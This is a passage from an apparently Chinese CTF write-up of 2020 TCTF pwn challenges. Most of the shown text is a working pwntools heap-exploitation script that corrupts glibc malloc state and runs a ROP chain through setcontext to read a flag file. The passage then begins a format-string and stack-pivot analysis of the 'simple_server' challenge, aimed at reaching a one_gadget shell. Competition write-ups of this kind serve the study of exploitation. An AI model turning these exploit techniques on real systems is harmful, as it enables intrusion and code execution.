class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>    Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1b0</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1b0</span><span class="token operator">-</span><span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0xa0 unsortedbin</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1b0</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>broken_chunk<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1b0</span><span class="token operator">-</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x90 unsortedbin</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>broken_chunk<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>fake_size <span class="token operator">/</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>broken_chunk <span class="token operator">-</span> fake_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Zhi<span class="token punctuation">(</span>fake_size <span class="token operator">+</span> <span class="token number">0x11</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x3f0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401</span><span class="token operator">-</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>pad_chunk<span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x201</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Jue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main_arena <span class="token operator">-=</span> <span class="token number">96</span>libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">0x1E4C30</span>global_max_fast <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1e7600</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1E75A8</span>initial <span class="token operator">=</span> free_hook <span class="token operator">-</span> <span class="token number">0xb68</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'heap : %s'</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc_base : %s'</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'main_arena : %s'</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'global_max_fast : %s'</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>global_max_fast<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'free_hook : %s'</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>heap<span class="token number">-1344</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast <span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake 0xa0 small chunk</span>payload <span class="token operator">+=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>  Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'global_max_fast changed'</span><span class="token punctuation">)</span> Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x248</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x201</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x201</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x191</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x181</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x171</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x161</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x151</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x141</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x131</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x121</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1f0</span><span class="token punctuation">,</span>payload<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x248</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x248</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x81</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x248</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">+</span> <span class="token number">64</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x248</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x201</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x70</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x161</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x151</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x141</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x131</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x248</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>top_chunk <span class="token operator">=</span> initial <span class="token operator">+</span> <span class="token number">0x10</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>top_chunk<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0xc8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">+</span> <span class="token number">304</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">304</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">304</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pad <span class="token operator">=</span> main_arena <span class="token operator">+</span> <span class="token number">0x60</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>top_chunk<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token number">-0xb68</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">22</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pop_rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026542</span>pop_rsi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026f9e</span>pop_rdx <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000012bda6</span>pop_rax <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span>syscall <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000010CF7F</span>flag <span class="token operator">=</span> free_hook <span class="token operator">+</span> <span class="token number">8</span>read_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x10CF70</span>write_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x10D010</span>ropchain <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>ropchain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>ropchain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21001</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>top_chunk<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>setcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x55E35</span>tar <span class="token operator">=</span> free_hook <span class="token operator">-</span> <span class="token number">0x328</span>rdx <span class="token operator">=</span> tar <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token operator">-</span><span class="token number">0xa0</span> <span class="token operator">-</span><span class="token number">8</span>tar_rsp <span class="token operator">=</span> tar <span class="token operator">+</span> <span class="token number">0xe0</span>io_wfile_sync <span class="token operator">=</span> <span class="token number">0x89460</span> <span class="token operator">+</span> libc_basepayload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>tar<span class="token operator">+</span><span class="token number">0xb0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0xa0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>tar<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0xb0</span>payload <span class="token operator">+=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>tar_rsp <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0xe0</span>payload <span class="token operator">+=</span> ropchainpayload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x328</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>io_wfile_sync<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'./flag\x00'</span>Gong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Shang<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="初赛-simple-server"><a href="#初赛-simple-server" class="headerlink" title="初赛-simple_server"></a>初赛-simple_server</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/2.png"></div>保护全开<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/3.png"></div>格式化字符串漏洞远程环境的stderr被重定向到了/dev/null，因此远程无法泄露地址，虽然本地可以。## 思路<p>定位到格式化漏洞函数前的栈布局</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/4.png"></div>我们看到dc50-&gt;dd70-&gt;dd90这一串RBP链。利用这个rbp链通过两次leave ret来进行栈迁移，修改修改后的值为rsp，这样如果在对应的rsp上布置了one_gadget，那么就可以直接getshell了。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/5.png"></div>同时注意到这里，如果输入的number长度为0x18，那么dce8就会指向dd08，dd08指向libc地址。这样就找到了格式化字符串修改链了。<p>新姿势：<br>可以从栈里取一个libc的地址作为宽度然后接上一个常数宽度的格式化串，实现libc地址+固定偏移，然后利用”%n”写回栈里，这样就无需泄露地址了。</p><p>比如{}c%*30$c%26$n，意思就是从30处读取4个字节作为参数，写到我们需要的位置，例如：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/6.png"></div>箭头被指向是我们想修改的地方，此时我们会将30位置处后四位0xf7a72400作为参数传递进26位置，{}中再写入后四bit的值来进行修改。如果我们正常写则需要多爆破三位的libc地址。<p>读出来是f7dcfa00，我们要写入f7dfffff需要改后五位为0xfffff，则就可以</p><p>{}c%*30$c%26$n.format(0xfffff)，就避免前面三个bit的爆破，以及减少输出字节数</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 